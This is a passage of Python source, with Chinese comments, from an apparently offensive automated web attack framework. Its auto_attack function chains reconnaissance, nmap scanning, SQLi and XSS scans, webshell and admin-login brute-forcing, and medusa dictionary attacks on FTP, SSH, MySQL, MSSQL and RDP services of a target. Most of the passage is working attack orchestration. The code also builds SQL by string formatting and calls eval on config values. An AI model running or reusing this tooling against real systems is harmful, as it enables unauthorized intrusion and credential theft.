        (target_urls_table_name), DB_NAME)
    if result is not None and len(result) > 0:
        for each in result:
            if len(each) > 0:
                # 在函数crack_webshell中包括检测url是否可能是webshell,并标记到数据库中相应字段,以及webshell爆破并根据爆
                # 破情况标记到数据库中相应字段,并邮件通知成功爆破的webshell
                crack_webshell(each[0])


def single_crack_admin_page_scan(target):
    # 这里爆破所有可能是管理登录的页面,普通用户登录页面也爆破
    # target可以是主要目标或是主要目标的旁站或子站
    # dirb后缀扫描后与爬虫获得的url联合找出可疑登录页面,并进行爆破


    global DB_NAME
    urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    result = execute_sql_in_db(
        "select url from `%s` where like_admin_login_url='1'" %
        (urls_table_name), DB_NAME)
    if len(result) > 0:
        for each in result:
            # crack_admin_login_url函数包括登录页面爆破,并在爆破成功后标记相应字段到数据库与发送邮件

            # 这里设置验证码长度为4是为了在实验中真实验证码长度为4,具体自动化时应该将yanzhengma_len=4这个参数去掉
            crack_admin_login_url(each[0], yanzhengma_len=4)
    else:
        from colorama import init, Fore
        init(autoreset=True)
        print(
            Fore.YELLOW +
            "does't find a admin page to crack from %s" %
            target)


def single_port_scan(target):
    # 这里扫描开放端口与服务情况
    # target可以是主要目标或是主要目标的旁站或子站,但是端口扫描比较特殊,如果target为旁站domain,则不进行端口扫描
    # 因为旁站与主站是同一ip,如果target是子站domain,进行端口扫描
    global DB_NAME


    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"


    import os

    def portScan(ip):
        if "not found" in get_string_from_command("nmap"):
            os.system("apt-get -y install nmap")
        os.system("nmap -v %s 2>&1 | tee /tmp/nmapresult" % ip)
        with open("/tmp/nmapresult", "r+") as f:
            returnValue = f.read()
        os.system("rm /tmp/nmapresult")
        return returnValue

    if target[:4] != "http":
        print("error,target should be like http(s)://xxx.xxx.xxx")
        return
    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "port_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        target_is_pang_domain = False
        for each_table in table_name_list:
            # 旁站不再扫描端口
            if each_table[-5:] == "_pang":
                target_is_pang_domain = True
                break
        if target_is_pang_domain:
            strings_to_write = "same as main domain"
        else:
            # 如果前面第2次的cdn模块运行后没有得到子站的真实ip,则不进行端口扫描
            for each_table in table_name_list:
                result = execute_sql_in_db("select actual_ip_from_cdn_scan from %s where %s='%s'" %
                                           (each_table,column_name, target),DB_NAME)
                if len(result) > 0 and result[0][0] != "has cdn,but can not find actual ip":
                    ip = result[0][0]
                    strings_to_write = portScan(ip)
                else:
                    strings_to_write = "I will not scan port coz find no actual ip behind cdn"

        for each_table in table_name_list:
            execute_sql_in_db(
                "update `%s` set port_scan_info='%s' where %s='%s'" %
                (each_table, strings_to_write,column_name, target), DB_NAME)


def single_portBruteCrack_scan(target):
    # 这里进行端口暴力破解的扫描
    # target可以是主要目标或是主要目标的旁站或子站,但是旁站不进行端口暴破,子站如果与主要目标ip不同再进行端口暴破

    # 对于主要目标,首先判断主要目标是否已经有开放了的端口信息21,22,3306,1433,3389,如果没有则不进行端口暴破
    # 对于子站目标,首先看ip是否是与主站相同,如果不是再进行21,22,3306,1433,3389端口暴破


    global DB_NAME
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"


    def portBruteCrack(ip, nmapResultString):
        # 常见端口暴力破解,根据nmap的扫描结果
        # 首先查找当前ip已经得到的端口扫描的结果中有没有常见开放端口,如果有则暴力破解,如果没有或者不暴力破解
        returnString = ""
        if not os.path.exists("/usr/local/bin/medusa"):
            install_medusa()
        if re.search("Discovered open port 21/tcp", nmapResultString, re.I):
            cmd = "medusa -h %s -U %s -P %s -t 5 -O /tmp/medusaResult -M ftp -v 6" % (
                ip, ModulePath + "dicts/user.txt", ModulePath + "dicts/pass.txt")
            print(cmd)
            os.system(cmd)
            with open("/tmp/medusaResult", "r+") as f:
                content = f.read()
                print(content)
            if re.search(r"success", content, re.I):
                returnString += content
            os.system("rm /tmp/medusaResult")

        if re.search("Discovered open port 22/tcp", nmapResultString, re.I):
            cmd = "medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M ssh -v 6" % (
                ip, ModulePath + "dicts/pass.txt")
            os.system(cmd)
            with open("/tmp/medusaResult", "r+") as f:
                content = f.read()
            if re.search(r"success", content, re.I):
                returnString += content
            os.system("rm /tmp/medusaResult")
        if re.search("Discovered open port 3306/tcp", nmapResultString, re.I):
            cmd = "medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M mysql -v 6" % (
                ip, ModulePath + "dicts/pass.txt")
            with open("/tmp/medusaResult", "r+") as f:
                content = f.read()
            if re.search(r"success", content, re.I):
                returnString += content
            os.system("rm /tmp/medusaResult")

        if re.search("Discovered open port 1433/tcp", nmapResultString, re.I):
            cmd = "medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M mssql -v 6" % (
                ip, ModulePath + "dicts/pass.txt")
            with open("/tmp/medusaResult", "r+") as f:
                content = f.read()
            if re.search(r"success", content, re.I):
                returnString += content
            os.system("rm /tmp/medusaResult")

        if re.search("Discovered open port 3389/tcp", nmapResultString, re.I):
            cmd = "medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M rdp -v 6" % (
                ip, ModulePath + "dicts/pass.txt")
            with open("/tmp/medusaResult", "r+") as f:
                content = f.read()
            if re.search(r"success", content, re.I):
                returnString += content
            os.system("rm /tmp/medusaResult")

        return returnString

    if target[:4] != "http":
        print("error,target should be like http(s)://xxx.xxx.xxx")
        return
    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "portBruteCrack_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        target_is_pang_domain = False
        target_is_sub_domain = False
        for each_table in table_name_list:
            # 旁站不进行端口暴破
            if each_table[-5:] == "_pang":
                target_is_pang_domain = True
                break
        for each_table in table_name_list:
            # 判断是否为子站
            if each_table[-5:] == "_sub":
                target_is_sub_domain = True
                break
        if target_is_pang_domain:
            strings_to_write = "same as main domain"
        else:
            # 如果前面第2次的cdn模块运行后没有得到子站的真实ip,则不进行端口暴力破解
            for each_table in table_name_list:
                result = execute_sql_in_db("select actual_ip_from_cdn_scan from %s where %s='%s'" %
                                           (each_table,column_name, target),DB_NAME) 
                if len(result) > 0 and result[0][0] != "has cdn,but can not find actual ip":
                    ip = result[0][0]
                    if target_is_sub_domain:
                        # 如果是子站(也即不是主要目标),找出子站对应的主要目标的ip,如果与这个ip不同则进行端口暴破
                        main_target_http_domain = get_source_main_target_domain_of_sub_url(target)[
                            'http_domain']
                        result = execute_sql_in_db("select actual_ip_from_cdn_scan from %s where %s='%s'" %
                                                   (get_main_target_table_name(main_target_http_domain),column_name,
                                                       main_target_http_domain),DB_NAME) 
                        if len(result) > 0 and result[0][0] != "has cdn,but can not find actual ip":
                            main_target_ip = result[0][0]
                            if ip != main_target_ip:
                                result = execute_sql_in_db("select port_scan_info from %s where %s='%s'" %
                                                           (each_table,column_name, target),DB_NAME) 
                                if len(result) > 0:
                                    nmap_result_string = result[0][0]
                                    strings_to_write = portBruteCrack(
                                        ip, nmap_result_string)
                                else:
                                    strings_to_write = "coz I found no nmap scan result from database,I will not run port brute crack module"
                            else:
                                # 当前目标是子站,但是与主要目标在同一ip,这种情况不进行端口暴力破解
                                strings_to_write = "current target is a sub domain target,but its ip is same to it's main target ip"
                    else:
                        # 如果是主要目标且不是子站
                        result = execute_sql_in_db("select port_scan_info from %s where %s='%s'" %
                                                   (each_table,column_name, target),DB_NAME) 
                        if len(result) > 0:
                            nmap_result_string = result[0][0]
                            strings_to_write = portBruteCrack(
                                ip, nmap_result_string)
                        else:
                            strings_to_write = "coz I found no nmap scan result from database,I will not run port brute crack module"

                else:
                    # 不管是主要目标还是子站,如果之前没有找到真实ip,则不进行端口暴力破解
                    strings_to_write = "I will not brute crack common open ports coz find no actual ip behind cdn"

        for each_table in table_name_list:
            execute_sql_in_db(
                "update `%s` set portBruteCrack_info='%s' where %s='%s'" %
                (each_table, strings_to_write,column_name, target),DB_NAME) 


def single_whois_scan(target):
    # 这里进行whois信息收集的扫描
    # target可以是主要目标或是主要目标的旁站或子站,但是子站不找whois,旁站找whois


    global DB_NAME
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"

    def whoisCollect(target):
        # 找whois会找域名的whois信息,eg.music.baidu.com找的时候会找baidu.com域名的信息,所以子站不需要找whois,
        # 旁站如果是子站的情况也不找whois
        import re
        result = get_request("http://whois.chinaz.com/%s" %
                             get_root_domain(target))
        content = result['content']
        # print(content)
        pattern = re.compile(
            r'''(注册商.*)(\n)|(\r\n).{,200}-------站长之家 <a href="http://whois.chinaz.com">Whois查询</a>-------''')
        out = re.search(pattern, content).group(1)
        pattern1 = re.compile("\>?([^\<\>]*)\<")
        result = re.findall(pattern1, out)
        # print(result)
        return_string = ""
        for each in result:
            if each not in ["注册商", "联系人", "联系方式", "创建时间", "过期时间", "公司", "域名服务器", "DNS", "状态", ""]:
                return_string += (each)
            elif each != "":
                return_string += ("\n" + each + ":\n")
        return return_string

    if target[:4] != "http":
        print("error,target should be like http(s)://xxx.xxx.xxx")
        return
    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "whois_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        target_is_sub_domain = False
        for each_table in table_name_list:
            if each_table[-4:] == "_sub":
                target_is_sub_domain = True
                break
        if not target_is_sub_domain:
            strings_to_write = whoisCollect(target)
        else:
            strings_to_write = "whois is same to main target"

        for each_table in table_name_list:
            execute_sql_in_db(
                "update `%s` set whois_info='%s' where %s='%s'" %
                (each_table, strings_to_write,column_name, target),DB_NAME) 


def scan_way_init():
    global SCAN_WAY
    existScanWay = 0
    if os.path.exists(CONFIG_INI_PATH):
        with open(CONFIG_INI_PATH, "r+") as f:
            configFileString = f.read()
        if re.search("SCAN_WAY.*=\D*\d+", configFileString, re.I):
            existScanWay = eval(get_key_value_from_config_file(
                CONFIG_INI_PATH, 'default', 'scan_way'))
            if existScanWay != 0:
                defaultChoose = existScanWay
        else:
            defaultChoose = 1
    else:
        defaultChoose = 1
    print("1>scan targets and targets' pang domains\n\
2>scan targets and targets' sub domains\n\
3>scan targets and targets' pang domains and sub domains\n\
4>scan targets without pang and without sub domains")
    print("please input your chioce,default [%s]" % str(defaultChoose))
    choose = get_input_intime(str(defaultChoose))
    if choose != str(defaultChoose):
        update_config_file_key_value(
            CONFIG_INI_PATH, 'default', 'SCAN_WAY', int(choose))
        SCAN_WAY=int(choose)
    else:
        update_config_file_key_value(
            CONFIG_INI_PATH, 'default', 'SCAN_WAY', defaultChoose)
        SCAN_WAY=defaultChoose


def get_http_pang_domains_list_from_db(target, db):
    # 从数据库中获取主要目标的旁站列表
    # target要是主要目标
    return_value = []
    pang_table_name = target.split("/")[-1].replace(".", "_") + "_pang"
    if not exist_table_in_db(pang_table_name,db):
        return []
    else:
        result = execute_sql_in_db(
            "select http_domain from `%s`" %
            pang_table_name, db)
        if len(result) > 0:
            for each in result:
                if len(each) > 0:
                    return_value.append(each[0])
        return return_value


def get_http_sub_domains_list_from_db(target, db):
    # 从数据库中获取主要目标的子站列表
    # target要是主要目标
    return_value = []
    sub_table_name = target.split("/")[-1].replace(".", "_") + "_sub"
    if not exist_table_in_db(sub_table_name,db):
        return []
    else:
        result = execute_sql_in_db(
            "select http_domain from `%s`" %
            sub_table_name, db)
        if len(result) > 0:
            for each in result:
                if len(each) > 0:
                    return_value.append(each[0])
        return return_value


def get_url_start_url(url):
    # eg. url=http://www.baidu.com/cms/laal.jsp
    # there are [http://www.baidu.com] and 
    # [http://www.baidu.com/cms] in config.ini
    # in this case ,it should return http://www.baidu.com/cms 
    if "http://" in url:
        url_a=url.replace("http://","https://")
    elif "https://" in url:
        url_a=url.replace("https://","http://")

    if not os.path.exists(CONFIG_INI_PATH):
        return ""
    with open(CONFIG_INI_PATH, "r") as f:
        content = f.read()
    a=re.findall(r"\[(http.+)\]\n",content)
    matchList=[]
    if len(a)>0:
        for each in a:
            if each in url or each in url_a:
                matchList.append(each)
        if len(matchList)>0:
            maxLen=0
            for each in matchList:
                if len(each)>=maxLen:
                    maxLen=len(each)
                    maxUrl=each
    return maxUrl

def get_cms_entry_from_start_url(start_url):
    # eg.start_url="http://192.168.1.10/dvwa/index.php"
    # return:"http://192.168.1.10/dvwa/"
    # eg.start_Url="http://192.168.1.10:8000"
    # return:"http://192.168.1.10:8000/"
    from urllib.parse import urlparse
    parsed=urlparse(start_url)
    path=parsed.path
    if "/" in path:
        file_part=path.split("/")[-1]
        if "." in file_part:
            file_part_index=start_url.find(file_part)
            return_value=start_url[:file_part_index]
        else:
            if path[-1]!="/":
                path=path+"/"
            return_value=parsed.scheme+"://"+parsed.netloc+parsed.path
    else:
        return_value=start_url+"/"
    return return_value



def get_url_cookie(url):
    # 得到url的cookie,目前为从config.ini文件中获取
    # eg.url=https://www.baidu.com:8080/dvwa/1.php
    # 如果url在config.ini中没有cookie,则查找config.ini中是否有url对应的主站有cookie，如果有对应的主站
    # 有cookie,则用url对应的start_url的cookie
    # 如果没有则返回""空字符串

    if not os.path.exists(CONFIG_INI_PATH):
        return ""
    with open(CONFIG_INI_PATH, "r") as f:
        content = f.read()
    a=re.findall(r"\[(http.+)\]\n",content)
    matchList=[]
    if len(a)>0:
        for each in a:
            if each in url:
                matchList.append(each)
        if len(matchList)>0:
            maxLen=0
            for each in matchList:
                if len(each)>=maxLen:
                    maxLen=len(each)
                    maxUrl=each
            cookie = eval(get_key_value_from_config_file(
                CONFIG_INI_PATH, maxUrl, 'cookie'))
            return cookie
        else:
            # http://192.168.8.190/test use http://192.168.8.190/dvwa 's cookie
            for each in a:
                if get_http_domain_from_url(each)==get_http_domain_from_url(url):
                    cookie = eval(get_key_value_from_config_file(
                        CONFIG_INI_PATH, each, 'cookie'))
                    return cookie
            # 没有url对应的cookie则查找对应主站的cookie,如果有对应主站的cookie则返回主站的cookie
            # http://wit.freebuf.com use http://www.freebuf.com 's cookie
            main_target_domain = get_url_belong_main_target_domain(url)
            if main_target_domain is None:
                return ""
            tmp = main_target_domain.replace(".", "\.")
            find_main_domain = re.search(r"\[(http(s)?://%s)\]" % tmp, content)
            if find_main_domain:
                main_domain_url = find_main_domain.group(1)
                cookie = eval(get_key_value_from_config_file(
                    CONFIG_INI_PATH, main_domain_url, 'cookie'))
                return cookie

    return ""

    
def set_target_scan_finished(start_url):
    # 根据扫描模式设置扫描完成
    global DB_NAME
    global SCAN_WAY
    target=get_http_domain_from_url(start_url)
    main_target_table_name = get_main_target_table_name(target)
    pang_table_name = target.split("/")[-1].replace(".", "_") + "_pang"
    sub_table_name = pang_table_name[:-5] + "_sub"
    http_pang_domains_list = get_http_pang_domains_list_from_db(
        target,DB_NAME) 
    http_sub_domains_list = get_http_sub_domains_list_from_db(
        target,DB_NAME) 

    # 上面将pang和sub表中的相关scaned字段设置为1
    # 下面将targets|first_targets表中相关scaned字段设置为1

    # 将targets|first_targets表中的scan_finished字段在targets|first_targets表中与主要目标相关的scaned字段为1时设
    # 置为1,表示与主要目标相关的扫描全部完成,但不考虑旁站或子站的扫描情况
    columns_result = execute_sql_in_db(
        "select column_name from information_schema.columns where table_name='%s' and column_name regexp '.*scaned' and column_name not regexp '(pang)|(sub).*' order by table_name" %
        main_target_table_name,DB_NAME) 
    if len(columns_result) > 0:
        for each in columns_result:
            column_name = each[0]

            column_scaned = get_scan_finished(column_name,DB_NAME,main_target_table_name, "start_url",start_url)
            if column_scaned == 0:
                return
        set_scan_finished(
            "scan_finished",
            DB_NAME,
            main_target_table_name,
            "start_url",
            start_url)

    # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
    # 并将target|first_targets表中的pang_domains_scan_finished字段设置为1
    if SCAN_WAY== 1:
        # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % pang_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each_http_pang_domain in http_pang_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(column_name,DB_NAME,pang_table_name, "http_domain",each_http_pang_domain)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        DB_NAME,
                        pang_table_name,"http_domain",
                        each_http_pang_domain)

        # 并将target|first_targets表中的pang_domains_scan_finished字段设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp 'pang.*scaned' order by table_name" % main_target_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name,DB_NAME, 
                    main_target_table_name, "start_url",start_url)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "pang_domains_scan_finished",
                DB_NAME,
                main_target_table_name,
                "start_url",start_url)

    # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
    # 并将target|first_targets表中的sub_domains_scan_finished字段设置为1
    elif SCAN_WAY== 2:
        # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % sub_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each_http_sub_domain in http_sub_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name,DB_NAME, 
                        sub_table_name, "http_domain",each_http_sub_domain)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        DB_NAME,
                        sub_table_name,"http_domain",
                        each_http_sub_domain)

        # 并将target|first_targets表中的sub_domains_scan_finished字段设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp 'sub.*scaned' order by table_name" % main_target_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name,DB_NAME, 
                    main_target_table_name, "start_url",start_url)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "sub_domains_scan_finished",
                DB_NAME,
                main_target_table_name,"start_url",
                start_url)

    # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
    # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
    # 并将targets|first_targets表中的pang_domains_scan_finished和sub_domains_scan_finished都设置为1
    elif SCAN_WAY== 3:
        # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % pang_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each_http_pang_domain in http_pang_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name,DB_NAME, 
                        pang_table_name, "http_domain",each_http_pang_domain)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        DB_NAME,
                        pang_table_name,
                        "http_domain",each_http_pang_domain)

        # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % sub_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each_http_sub_domain in http_sub_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name,DB_NAME, 
                        sub_table_name, "http_domain",each_http_sub_domain)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        DB_NAME,
                        sub_table_name,"http_domain",
                        each_http_sub_domain)

        # 并将targets|first_targets表中的pang_domains_scan_finished和sub_domains_scan_finished都设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '(pang)|(sub).*scaned' order by table_name" %
main_target_table_name,DB_NAME) 
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name,DB_NAME, 
                    main_target_table_name, "start_url",start_url)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "pang_domains_scan_finished",
                DB_NAME,
                main_target_table_name,"start_url",
                start_url)
            set_scan_finished(
                "sub_domains_scan_finished",
                DB_NAME,
                main_target_table_name,"start_url",
                start_url)

    elif SCAN_WAY== 4:
        pass
    else:
        print("SCAN_WAY error,check it")


class MyScanner(object):

    def __init__(self, start_url, single_xxx_scan):
        global SCAN_WAY
        xxxValue = single_xxx_scan.__name__[7:-5]
        target=get_http_domain_from_url(start_url)
        # 根据SCAN_WAY的值对target进行脚本类型识别扫描
        main_target_table_name = get_main_target_table_name(start_url)
        http_domain_xxx_scaned = get_scan_finished(
            xxxValue + "_scaned",DB_NAME, 
            main_target_table_name, "start_url",start_url)
        pang_domains_xxx_scaned = get_scan_finished(
            "pang_domains_" + xxxValue + "_scaned",
            DB_NAME,
            main_target_table_name,"start_url",
            start_url)
        sub_domains_xxx_scaned = get_scan_finished(
            "sub_domains_" + xxxValue + "_scaned",
            DB_NAME,
            main_target_table_name,"start_url",
            start_url)
        if http_domain_xxx_scaned == 1 and pang_domains_xxx_scaned == 1 and sub_domains_xxx_scaned == 1:
            return
        else:
            if http_domain_xxx_scaned == 0:
                single_xxx_scan(target)
                set_scan_finished(
                    xxxValue + "_scaned",
                    DB_NAME,
                    main_target_table_name,"start_url",
                    start_url)

            elif http_domain_xxx_scaned == 1:
                print("main target %s scaned" % xxxValue)
                pass
            else:
                print("get_scan_finished error in %s func" %
                      single_xxx_scan.__name__)
            if SCAN_WAY== 1:
                if pang_domains_xxx_scaned == 1:
                    return
                # 从数据库中获取target的旁站列表
                sql = "select http_domain from `%s`" % (
                    target.split("/")[-1].replace(".", "_") + "_pang")
                result = execute_sql_in_db(
                    sql,DB_NAME) 
                if len(result) > 0:
                    for each in result:
                        if each[0] != "":
                            xxx_scaned = get_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                "/")[-1].replace(".", "_") + "_pang", "http_domain",each[0])
                            if xxx_scaned == 0:
                                single_xxx_scan(each[0])
                                set_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                    "/")[-1].replace(".", "_") + "_pang","http_domain", each[0])

                        else:
                            print(
                                "%s func's each[0] error in SCAN_WAY 1" % single_xxx_scan.__name__)
                else:
                    print("%s func's %s error or target has no pang domains" %
                          (single_xxx_scan.__name__, sql))

                set_scan_finished(
                    "pang_domains_" + xxxValue + "_scaned",
                    DB_NAME,
                    main_target_table_name,"start_url",
                    start_url)

            elif SCAN_WAY== 2:
                if sub_domains_xxx_scaned == 1:
                    return
                # 从数据库中获取target的子站列表
                sql = "select http_domain from `%s`" % (
                    target.split("/")[-1].replace(".", "_") + "_sub")
                result = execute_sql_in_db(
                    sql,DB_NAME) 
                if len(result) > 0:
                    for each in result:
                        if each[0] != "":
                            xxx_scaned = get_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                            if xxx_scaned == 0:
                                single_xxx_scan(each[0])
                                set_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                    "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])

                        else:
                            print(
                                "%s func's each[0] error in SCAN_WAY 2" % single_xxx_scan.__name__)
                else:
                    print("%s func's %s error or target has no sub domains " %
                          (single_xxx_scan.__name__, sql))

                set_scan_finished(
                    "sub_domains_" + xxxValue + "_scaned",
                    DB_NAME,
                    main_target_table_name,"start_url",
                    start_url)

            elif SCAN_WAY== 3:
                # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
                # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
                # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

                # 从数据库中获取target的旁站列表
                if pang_domains_xxx_scaned == 1 and sub_domains_script_type_scaned == 1:
                    return
                pang_list = []
                sql = "select http_domain from `%s`" % (
                    target.split("/")[-1].replace(".", "_") + "_pang")
                result = execute_sql_in_db(
                    sql, DB_NAME)
                if len(result) > 0:
                    for each in result:
                        if each[0] != "":
                            pang_list.append(each[0])
                            xxx_scaned = get_scan_finished("script_type_scaned", DB_NAME, target.split(
                                "/")[-1].replace(".", "_") + "_pang","http_domain", each[0])
                            if xxx_scaned == 0:
                                single_xxx_scan(each[0])
                                set_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                    "/")[-1].replace(".", "_") + "_pang","http_domain", each[0])

                        else:
                            print(
                                "%s func's each[0] error in SCAN_WAY 3" % single_xxx_scan.__name__)
                else:
                    print("%s func's %s error or target has no pang domains" %
                          (single_xxx_scan.__name__, sql))

                set_scan_finished(
                    "pang_domains_" + xxxValue + "_scaned",
                    DB_NAME,
                    main_target_table_name,"start_url",
                    start_url)

                # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
                sql = "select http_domain from `%s`" % (
                    target.split("/")[-1].replace(".", "_") + "_sub")
                result = execute_sql_in_db(
                    sql,DB_NAME) 
                if len(result) > 0:
                    for each in result:
                        if each[0] != "" and each[0] not in pang_list:
                            xxx_scaned = get_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])
                            if xxx_scaned == 0:
                                single_xxx_scan(each[0])
                                set_scan_finished(xxxValue + "_scaned", DB_NAME, target.split(
                                    "/")[-1].replace(".", "_") + "_sub","http_domain", each[0])

                        elif each[0] in pang_list:
                            print(
                                "%s is pang domain and sub domain and will not script type scan in sub domain \
table since it has script type scanned in pang domain table" %
                                each[0])
                        else:
                            print(
                                "%s func's each[0] error in SCAN_WAY 3" % single_xxx_scan.__name__)
                else:
                    print("%s func's %s error or target has no sub domains" %
                          (single_xxx_scan.__name__, sql))

                set_scan_finished(
                    "sub_domains_" + xxxValue + "_scaned",
                    DB_NAME,
                    main_target_table_name,"start_url",
                    start_url)

            elif SCAN_WAY== 4:
                pass
            else:
                print("SCAN_WAY error in %s" % single_xxx_scan)


def auto_attack(start_url):
    # 自动化检测target流程
    # 根据扫描模式进行cdn情况扫描,如果有cdn,尝试获取真实ip
    # cdn模块的结果影响端口扫描模块,也影响是否进行旁站获取,cdn模块在获取旁站模块前要运行一次,
    # 在获取子站模块后要再运行一次,第1次是为了给是否获取旁站提供指导,第2次是为了给子站获取真实ip,给端口扫描子站
    # 提供指导
    global DB_NAME
    global SCAN_WAY
    target=get_http_domain_from_url(start_url)
    MyScanner(start_url, single_cdn_scan)
    # 第一次single_cdn_scan(模板中会将pang_domains_cdn_scaned或sub_domains_cdn_scaned根据SCAN_WAY设置为1)
    # 于是这里由于还没到获取旁站和子站模块,只是对主要目标进行single_cdn_scan,所以下面要将pang_domains_cdn_scaned
    # 和sub_domains_cdn_scaned设置为0
    main_target_table_name = get_main_target_table_name(target)
    if SCAN_WAY in [1, 3]:
        set_scan_unfinished(
            "pang_domains_cdn_scaned",
            DB_NAME,
            main_target_table_name,
            "start_url",
            start_url)
    if SCAN_WAY in [2, 3]:
        set_scan_unfinished(
            "sub_domains_cdn_scaned",
            DB_NAME,
            main_target_table_name,
            "start_url",
            start_url)

    # 根据扫描模式进行旁站获取
    get_pang_domains(target)
    # 根据扫描模式进行子站获取
    get_sub_domains(target)
    # 下面是第2次运行cdn模块,前面第1次的cdn模块中实际只会对主要目标进行cdn模块的运行,第2次的cdn模块的运行对子站
    # 进行cdn识别
    MyScanner(start_url, single_cdn_scan)
    # crawl_scan是对target相关的目标(pang domains或sub domains)全部执行crawl_url爬虫的函数
    crawl_scan(start_url)

    # 根据扫描模式进行端口扫描
    # 端口扫描暂不设置DELAY
    MyScanner(start_url, single_port_scan)
    # 根据扫描模式进行高危漏洞扫描
    MyScanner(start_url, single_risk_scan)
    # 根据扫描模式进行sqli漏洞扫描
    # sqli_scan与其他scan模块不同,此处不用MyScanner类
    sqli_scan(start_url)
    # 根据扫描模式进行xss扫描
    MyScanner(start_url,single_xss_scan)
    # 根据扫描模式进行目录扫描
    MyScanner(start_url, single_script_type_scan)
    # 根据扫描模式进行目标脚本类型获取
    MyScanner(start_url, single_dirb_scan)
    # 根据扫描模式进行cms扫描
    MyScanner(start_url, single_cms_scan)
    # 根据扫描模式进行webshell爆破扫描
    # single_crack_webshell_scan不设置DELAY
    MyScanner(start_url, single_crack_webshell_scan)
    # 根据扫描模式进行登录页面扫描
    # single_crack_admin_page_scan不设置DELAY
    MyScanner(start_url, single_crack_admin_page_scan)
    # 根据扫描模式进行端口暴破
    # 端口暴破暂不设置DELAY
    MyScanner(start_url, single_portBruteCrack_scan)
    # 根据扫描模式进行whois信息获取
    MyScanner(start_url, single_whois_scan)
    # 根据扫描模式设置扫描完成
    set_target_scan_finished(start_url)


def scan_init():
    # 这个函数用于配置exp10itScanner要用到的参数
    global DB_NAME
    global DB_SERVER
    global DB_USER
    global DB_PASS
    global DELAY
    import os
    if not os.path.exists(CONFIG_PATH):
        os.system("mkdir %s" % CONFIG_PATH)
    if not os.path.exists(CONFIG_INI_PATH):
        os.system("touch %s" % CONFIG_INI_PATH)
    else:
        # 如果配置文件存在则不运行这个函数
        return
    with open(CONFIG_INI_PATH, 'r+') as f:
        content = f.read()

